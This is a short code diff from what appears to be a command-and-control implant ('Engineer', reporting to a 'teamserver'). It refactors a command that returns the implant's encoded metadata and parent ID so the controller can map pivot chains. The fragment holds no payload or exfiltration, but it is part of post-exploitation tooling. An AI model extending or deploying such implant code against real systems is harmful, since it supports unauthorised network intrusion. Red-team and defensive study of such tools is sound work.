@@ -1,11 +1,7 @@
-﻿using Engineer.Commands;
-using Engineer.Functions;
-using Engineer.Models;
-using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
+﻿using System;
 using System.Threading.Tasks;
+using DynamicEngLoading;
+
 
 namespace Engineer.Commands
 {
@@ -17,7 +13,7 @@ namespace Engineer.Commands
         public override async Task Execute(EngineerTask task)
         {
             task.Arguments.TryGetValue("/parentid", out string parentId);
-            Tasking.FillTaskResults(Convert.ToBase64String(Program._metadata.JsonSerialize()) +"\n" + parentId,task,EngTaskStatus.Complete,TaskResponseType.String); //gives back the engineers metadata and the parent so the teamserver can make the path
+            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(Convert.ToBase64String(Program._metadata.JsonSerialize()) +"\n" + parentId,task,EngTaskStatus.Complete,TaskResponseType.String); //gives back the engineers metadata and the parent so the teamserver can make the path
         }
     }
 }
